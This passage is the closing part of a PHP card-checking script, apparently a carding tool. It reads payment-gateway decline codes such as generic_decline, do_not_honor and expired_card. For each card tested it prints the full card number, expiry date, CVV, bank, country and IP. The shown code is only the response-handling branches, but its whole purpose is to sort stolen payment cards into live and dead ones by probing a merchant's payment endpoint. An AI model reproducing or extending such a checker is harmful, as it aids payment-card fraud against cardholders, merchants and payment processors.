  echo "<font size=2 color='red'>  <font class='badge badge-danger'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Card Declined ❌</i></font><br> <font class='badge badge-info'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2,  "generic_decline")) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Generic Decline ❌</i></font><br> <font class='badge badge-info'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2,  "do_not_honor")) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Do Not Honor ❌</i></font><br> <font class='badge badge-info'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2,  "expired_card")) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Expired Card ❌</i></font><br> <font class='badge badge-info'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2,  'Error updating default payment method. Your card does not support this type of purchase.')) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>Result : | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Response: Card Doesnt Support This Purchase ❌</i></font><br> <font class='badge badge-info'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2,  "processing_error")) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Processing Error ❌</i></font><br> <font class='badge badge-info'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2, "service_not_allowed")) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Service Not Allowed ❌</i></font><br> <font class='badge badge-info'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2,  "parameter_invalid_empty")) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Declined: Missing Card Details ❌</i></font><br> <font class='badge badge-info'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2,  "lock_timeout")) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Another Request In Process: Card Not Checked ❌</i></font><br> <font class='badge badge-info'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2,  "Error updating default payment method. transaction_not_allowed")) {
  echo "<font size=2 color='red'>  <font class='badge badge-success'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Transaction Not Allowed ❌</i></font><br> <font class='badge badge-info'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2,  'Card is declined ▸cc check by your bank, please contact them for additional information.')) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>3D Secure Redirect ❌</i></font><br> <font class='badge badge-info'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2, "missing_payment_information")) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Missing Payment Informations ❌</i></font><br> <font class='badge badge-info'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2, "Payment cannot be processed, missing credit card number")) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Missing Credit Card Number ❌</i></font><br> <font class='badge badge-info'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif 
(strpos($result2,  '-1')) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Update Nonce ❌</i></font> <br> <font class='badge badge-info'>$bank ▫️ $country ▫️ $ip</i></font> <br>";
} 

else {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='yellow'> <font class='badge badge-dark'>Card was Declined due to an Unknown Error ❌</i></font><br> <font class='badge badge-info'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

curl_close($ch);
ob_flush();

//echo $result1;
//echo $result2;
?>